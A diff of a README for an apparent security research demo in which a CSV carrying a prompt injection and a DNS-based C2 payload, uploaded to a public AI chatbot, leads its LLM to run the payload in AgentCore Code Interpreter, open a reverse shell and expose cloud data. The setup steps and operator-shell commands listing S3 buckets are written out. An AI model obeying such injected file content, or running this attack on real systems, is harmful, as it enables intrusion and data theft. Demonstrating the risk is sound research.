@@ -69,62 +69,63 @@ Large outputs split into multiple chunks (60 chars max per label):
 
 ## Realistic Attack Demo (No Credentials Required)
 
-The enhanced demo shows that an attacker with **NO AWS credentials** to the victim's account can exfiltrate sensitive data. The attack flow:
+The demo shows that an attacker with **NO AWS credentials** to the victim's account can exfiltrate sensitive data by uploading a malicious CSV through the victim's public chatbot web UI. The attack flow:
 
-1. **Attacker** deploys C2 server infrastructure
-2. **Victim** has a publicly-accessible AI chatbot (uses AgentCore Code Interpreter)
-3. **Attacker** sends malicious CSV with prompt injection to victim's public API
-4. **Chatbot** passes CSV to Code Interpreter for analysis
-5. **Prompt injection** triggers DNS C2 payload execution
-6. **Data exfiltrates** via DNS to attacker's C2 server
+1. **Attacker** deploys C2 server infrastructure in their own AWS account
+2. **Victim** has a publicly-accessible AI chatbot that uses AgentCore Code Interpreter
+3. **Attacker** generates a malicious CSV with an embedded C2 payload in a "Config" column
+4. **Attacker** uploads the CSV via the chatbot's web UI with a crafted analysis prompt
+5. **Chatbot** writes CSV to disk, passes the user's prompt to the LLM, LLM reads the file and executes the payload
+6. **C2 payload** establishes a DNS-based reverse shell from inside the sandbox
+7. **Attacker** sends commands and exfiltrates data via DNS
 
 ### Quick Start
 
-**Prerequisites:** 
-- Install [uv](https://docs.astral.sh/uv/getting-started/installation/) for Python dependency management.
-- AWS CLI configured in two separate accounts (one for attacker, one for victim)
-- 
+**Prerequisites:**
+- Install [uv](https://docs.astral.sh/uv/getting-started/installation/) for Python dependency management
+- AWS CLI configured (two separate accounts recommended: one attacker, one victim)
+- Terraform installed
 
-**Terminal 1 - Deploy attacker infrastructure:**
+**Terminal 1 - Deploy both infrastructures:**
 ```bash
-export DOMAIN_NAME="bt-research-control.com"
-export REGION="us-east-1"
-export BUCKET_NAME="agentcore-hacking"
-cat << EOF >> attacker-infra/terraform/terraform.tfvars
-domain_name = "${DOMAIN_NAME}"
-aws_region = "${REGION}"
-s3_bucket_name = "${BUCKET_NAME}"
-EOF
-
+# Deploy attacker C2 server
 cd attacker-infra
 export AWS_PROFILE=attacker-account
-make setup    # Install dependencies with uv
-make deploy   # Deploy C2 server to AWS
-```
+make setup && make deploy
 
-**Terminal 2 - Deploy victim infrastructure** (separate AWS account recommended):
-```bash
-cd victim-infra
+# Deploy victim chatbot (separate account recommended)
+cd ../victim-infra
 export AWS_PROFILE=victim-account
-make setup    # Install dependencies with uv
-make deploy   # Deploy vulnerable chatbot to AWS
-make show-url # Note the chatbot URL
+make setup && make deploy
+make show-url  # Note the chatbot URL
 ```
 
-**Terminal 3 - Launch the exploit** (from repo root):
+**Terminal 2 - Generate payload and upload via web UI:**
 ```bash
+cd attacker-infra
 export AWS_PROFILE=attacker-account
-# Generate payload + send to victim in one step (reads .victim_url automatically)
-make exploit
+make generate-csv
+```
 
-# Connect to the C2 session:
+This creates `malicious_data.csv` and prints a prompt to paste into the chatbot.
+
+1. Open the victim chatbot URL in your browser
+2. Upload `malicious_data.csv`
+3. Paste the suggested prompt into the message box
+4. Click "Analyze Data"
+
+**Terminal 3 - Connect to the C2 session:**
+```bash
+cd attacker-infra
 make connect-session
 
-# In the operator shell, run commands:
-# > whoami
-# > aws s3 ls
-# > aws dynamodb list-tables
+# In the operator shell:
+# c2:sess_xxxxx> whoami
+# c2:sess_xxxxx> aws s3 ls
+# c2:sess_xxxxx> python3 -c "import boto3; print(boto3.client('s3', region_name='us-east-1').list_buckets()['Buckets'])"
 ```
+
+See [docs/DEMO_GUIDE.md](docs/DEMO_GUIDE.md) for detailed step-by-step instructions and troubleshooting.
 
 ---
 
@@ -176,9 +177,11 @@ Generate a malicious CSV with embedded payload:
 make generate-csv
 ```
 
-Then either:
-- **Automated**: `make exploit TARGET=https://victim-chatbot.com` (or just `make exploit` if `.victim_url` exists)
-- **Manual**: Upload the generated CSV to the victim chatbot web UI
+Then upload via the victim chatbot's web UI (see [docs/DEMO_GUIDE.md](docs/DEMO_GUIDE.md) for the prompt to use), or use the CLI:
+
+```bash
+make exploit  # Reads .victim_url automatically
+```
 
 ### Step 2: Connect to the Code Interpreter Session
 
